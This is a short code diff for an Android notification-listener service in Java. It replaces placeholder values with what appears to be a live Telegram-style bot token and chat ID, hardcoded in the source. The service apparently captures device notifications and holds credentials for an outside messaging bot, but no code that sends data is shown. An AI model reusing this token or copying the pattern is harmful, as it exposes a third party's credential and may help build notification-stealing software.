@@ -6,8 +6,8 @@ import java.io.IOException;
 import okhttp3.*;
 
 public class NotificationService extends NotificationListenerService {
-    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN";
-    private static final String CHAT_ID = "YOUR_CHAT_ID";
+    private static final String BOT_TOKEN = "9014559285:AAEamXnqANi68FHT7mnT3DpF5hC1y9zmes4";
+    private static final String CHAT_ID = "6978974735";
     private final OkHttpClient client = new OkHttpClient();
 
     @Override
